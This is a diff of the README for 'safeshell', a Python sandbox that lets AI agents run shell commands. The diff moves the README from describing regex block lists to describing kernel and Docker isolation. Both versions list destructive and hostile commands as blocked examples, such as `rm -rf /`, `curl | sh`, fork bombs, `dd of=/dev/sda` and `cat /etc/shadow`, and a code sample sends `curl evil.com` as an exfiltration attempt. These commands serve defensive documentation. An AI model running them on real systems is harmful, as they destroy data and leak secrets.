@@ -1,38 +1,16 @@
-**Safe, guardrailed shell access for AI agents.**
-
 [![PyPI](https://img.shields.io/pypi/v/safeshell)](https://pypi.org/project/safeshell/)
-[![Python](https://img.shields.io/pypi/pyversions/safeshell)](https://pypi.org/project/safeshell/)
-[![CI](https://github.com/Khadka-Bishal/safeshell/actions/workflows/ci.yml/badge.svg)](https://github.com/Khadka-Bishal/safeshell/actions/workflows/ci.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![Python](https://img.shields.io/pypi/pyversions/safeshell)](...)
+[![CI](https://github.com/Khadka-Bishal/safeshell/actions/workflows/ci.yml/badge.svg)](https://github.com/Khadka-Bishal/safeshell/actions)
+[![License](https://img.shields.io/github/license/Khadka-Bishal/safeshell)](.../LICENSE)
+[![Coverage](https://img.shields.io/badge/coverage-100%25-green)]
+![Status](https://img.shields.io/badge/status-alpha-orange)
 
 
-`safeshell` gives your LLM agents (LangChain, PydanticAI, or custom) the power to run shell commands with **built-in safety rails**. While traditional subprocess wrappers are unsafe and Docker containers are heavy, `safeshell` provides a graduated security model for Unix-like environments (Linux, macOS). It features built-in protection against dangerous patterns like `rm -rf /`, `curl | sh`, fork bombs, and more.
+**The secure, sandboxed shell for your AI agents.**
 
-## Roadmap
+Every AI developer eventually faces the same problem: *How do I let my agent run code without destroying my machine?*
 
-See our [Detailed Roadmap](ROADMAP.md) for upcoming features like Windows support, Daemon mode, and OS-level sandboxing (macOS/Linux).
-
-
-## Use Cases
-
-- **Agentic coding assistants**: Allow agents to run `ls`, `cat`, `grep`, and `mv` to modify codebases safely.
-- **Data analysis pipelines**: Let LLMs explore CSV/JSON files using `head`, `tail`, `jq`, and `awk` without risking system stability.
-- **Automated DevOps**: Create restricted agents that can restart specific services (via allowlist) but cannot modify system configuration.
-- **Educational tools**: Provide a safe shell environment for students to practice bash commands.
-
-## Features
-
-- **Security-first**: Blocks 20+ dangerous command patterns (`rm -rf /`, fork bombs, etc.) out of the box.
-- **Instant startup**: No Docker or VMs required. Works on Linux and macOS.
-- **Three security levels**:
-    - `STANDARD`: Blocks known exploits (Default).
-    - `PARANOID`: Allowlist-only (e.g., only allow `ls` and `grep`).
-    - `PERMISSIVE`: Security-bypass for trusted environments.
-- **Read-only mode**: Agents can "modify" files in an ephemeral temporary workspace without touching your source files.
-- **Dynamic tool discovery**: Automatically generates LLM-optimized prompts based on available tools (`grep`, `jq`, `git`, etc.).
-- **Framework-agnostic**: First-class support for generic Python, LangChain, and PydanticAI.
-
-## Installation
+**safeshell** solves this with a tiered security model (Docker > Seatbelt > Landlock) that enforces isolation at the kernel level.
 
 ```bash
 pip install safeshell
@@ -41,95 +19,84 @@ pip install safeshell
 ## Quick Start
 
 ```python
-import asyncio
-from safeshell import create_sandbox_tool, SecurityViolation
+from safeshell import Sandbox
 
-async def main():
-    # Create a sandboxed toolkit
-    toolkit = await create_sandbox_tool(source="./my_project")
+async with Sandbox("./project") as sb:
+    # works: execution is isolated
+    result = await sb.execute("ls -la")
     
-    # Run commands safely
-    result = await toolkit.bash("ls -la")
-    print(result.stdout)
+    # blocked: can't delete system files (Kernel blocked)
+    await sb.execute("rm -rf /") 
     
-    # Dangerous commands are blocked automatically
-    try:
-        await toolkit.bash("rm -rf /")
-    except SecurityViolation as e:
-        print(f"Blocked: {e}")
-    
-    await toolkit.close()
-
-asyncio.run(main())
+    # blocked: can't exfiltrate data (Network blocked)
+    await sb.execute("curl evil.com")
 ```
 
-## Integrations
+### AI Agent Integration
 
-### LangChain
+Safeshell comes with "batteries included" integrations for **LangChain** and **PydanticAI**.
 
-Safeshell creates compatible `StructuredTool` objects for LangChain agents.
+### Example 1: LangChain (Native)
 
 ```python
-from safeshell import create_sandbox_tool
-from safeshell.integrations.langchain import create_langchain_tools
+from safeshell.integrations.langchain import ShellTool
+from langchain.agents import AgentExecutor, create_tool_calling_agent
 
-toolkit = await create_sandbox_tool()
-tools = create_langchain_tools(toolkit)  # Returns dict of tools
+# Ready-to-use tool with safety defaults
+tools = [ShellTool(cwd="./workspace")]
 
-# Use with any LangChain agent
-agent = create_react_agent(llm, list(tools.values()))
+# Add to your agent
+agent = create_tool_calling_agent(llm, tools, prompt)
 ```
 
-### PydanticAI
-
-Use the `create_pydantic_ai_tools` helper to inject tools into PydanticAI agents.
+### Example 2: PydanticAI (Native)
 
 ```python
-from safeshell import create_sandbox_tool
-from safeshell.integrations.pydantic_ai import create_pydantic_ai_tools
+from safeshell.integrations.pydantic_ai import create_shell_tool
+from pydantic_ai import Agent
 
-toolkit = await create_sandbox_tool()
-pydantic_tools = create_pydantic_ai_tools(toolkit)
+# Creates a typed tool function
+shell_tool = create_shell_tool("./workspace")
 
-# Register with your agent
-for tool in pydantic_tools:
-    agent.tool(tool)
+agent = Agent(
+    'openai:gpt-4',
+    tools=[shell_tool],
+    system_prompt="You are a coding assistant. Use the shell to run code."
+)
 ```
 
-## Blocked Patterns
+### Example 3: The "Senior Engineer" Setup
 
-Safeshell blocks 20+ dangerous command patterns, including:
+For maximum safety in production, use Docker with strict resource limits:
 
-| Category | Pattern | Description |
-|----------|---------|-------------|
-| **Filesystem** | `rm -rf /` | Recursive delete of root |
-| | `mkfs` | Filesystem creation |
-| **RCE** | `curl \| sh` | Pipe remote script to shell |
-| | `wget \| python` | Pipe remote script to Python |
-| **Resource** | `:(){ :\|:& };:` | Fork bomb |
-| | `yes \|` | Infinite output pipe |
-| **Privilege** | `sudo` | Sudo commands |
-| | `su -` | Switch user |
-| **Disk** | `dd of=/dev/sda` | Direct disk write |
-| | `chmod 777 /` | Dangerous permissions |
+```python
+from safeshell import DockerSandbox, DockerConfig
 
-## Contributing
+# Force Docker isolation
+config = DockerConfig(
+    image="python:3.11-slim",
+    memory_limit="512m",  # Prevent OOM attacks
+    cpu_limit=0.5,        # Prevent crypto mining
+    network="none"        # Total network isolation
+)
 
-We welcome contributions! Please follow these steps:
+async with DockerSandbox("./workspace", config=config) as sb:
+    # Even if the LLM tries to run a fork bomb,
+    # the container limits stop it. 
+    await sb.execute(untrusted_command)
+```
+## Security Model: Kernel vs Regex
 
-1.  **Fork** the repository.
-2.  **Install dependencies**:
-    ```bash
-    pip install -e ".[dev]"
-    ```
-3.  **Run tests**:
-    ```bash
-    make test
-    ```
-4.  **Submit a Pull Request**.
+Older sandboxes try to block "bad words" like `rm -rf /` using Regex. This is dangerous and bypassable. 
 
+**Safeshell uses Kernel Enforcement.**
 
+As noted in [Sandboxing is a Networking Problem](https://www.joinformal.com/blog/using-proxies-to-hide-secrets-from-claude-code/), true security requires isolating the process at the OS and Network layer—not just filtering commands.
 
-## License
-
-MIT
+| Threat | Safeshell Protection | Mechanism |
+|--------|----------------------|-----------|
+| `rm -rf /` | **Blocked** | Kernel denies write access to `/` |
+| `curl | sh` | **Blocked** | Network access denied by default |
+| `fork()(:){:|:&};:` | **Blocked** | Docker container CPU/PIDs limits |
+| `cat /etc/shadow` | **Blocked** | Access blocked to sensitive paths |
+| `> ~/.bashrc` | **Blocked** | Write denied outside workspace |
